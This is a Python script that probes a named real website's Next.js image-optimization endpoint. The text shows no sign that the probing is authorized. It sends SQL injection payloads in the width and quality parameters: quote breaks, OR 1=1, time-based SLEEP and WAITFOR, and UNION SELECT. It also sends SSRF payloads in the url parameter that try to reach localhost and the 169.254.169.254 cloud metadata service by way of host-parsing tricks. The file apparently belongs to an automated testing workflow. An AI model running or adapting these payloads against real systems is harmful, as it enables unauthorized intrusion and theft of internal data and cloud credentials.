import requests, os, time, urllib.parse
U = open('/work/ua_final.txt').read().strip()
H = {'User-Agent': U, 'Accept':'*/*'}
T = "https://www.infinitycapital.bh"
OUT = os.path.join(os.environ.get('WORK_PATH', '.'), 'tool_outputs')
os.makedirs(OUT, exist_ok=True)
GOOD = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"

def g(path, label=None):
    t0=time.time()
    try:
        r = requests.get(T+path, headers=H, timeout=40, allow_redirects=False)
        dt=time.time()-t0
        print("%-42s %s len=%-7d %5.2fs %s" % (label or path[:42], r.status_code, len(r.content), dt, r.text[:110].replace('\n',' ') if len(r.content)<2000 else r.headers.get('content-type')))
        return r, dt
    except Exception as e:
        print("%-42s ERR %s" % (label or path[:42], e)); return None,0

print("=== A. baseline /_next/image params ===")
g("/_next/image?url=%s&w=1080&q=75" % urllib.parse.quote(GOOD, safe=''), "baseline w=1080 q=75")
g("/_next/image?url=%s&w=1080&q=75'" % urllib.parse.quote(GOOD, safe=''), "q=75'")
g("/_next/image?url=%s&w=1080'%20OR%201=1--&q=75" % urllib.parse.quote(GOOD, safe=''), "w=1080' OR 1=1--")
g("/_next/image?url=%s&w=1080&q=75%20AND%20SLEEP(3)" % urllib.parse.quote(GOOD, safe=''), "q time SLEEP(3)")
g("/_next/image?url=%s&w=1080&q=75;WAITFOR%20DELAY%20'0:0:3'--" % urllib.parse.quote(GOOD, safe=''), "q mssql WAITFOR 3s")
g("/_next/image?url=%s&w=1080&q=1'%20UNION%20SELECT%20version()--" % urllib.parse.quote(GOOD, safe=''), "q UNION SELECT")
g("/_next/image?url=%s&w=-1*3*400" % urllib.parse.quote(GOOD, safe=''), "w=-1*3*400 (arith)")

print()
print("=== B. url= SSRF via allowed-host path tricks ===")
for tag,u in [
  ("at-127.0.0.1", "https://images.ctfassets.net@127.0.0.1/"),
  ("path-..-meta", "https://images.ctfassets.net/../../../../latest/meta-data/"),
  ("redirector-to-internal", "https://images.ctfassets.net//@169.254.169.254/latest/meta-data/"),
  ("hash-bypass", "https://images.ctfassets.net/#@127.0.0.1"),
  ("port", "https://images.ctfassets.net:8443/"),
  ("pct-encoded-host", "https://images.ctfassets.net%2f%2f%2f127.0.0.1/"),
  ("real-ctf-asset", GOOD),
]:
    g("/_next/image?url=%s&w=640&q=75" % urllib.parse.quote(u, safe=''), "url="+tag)
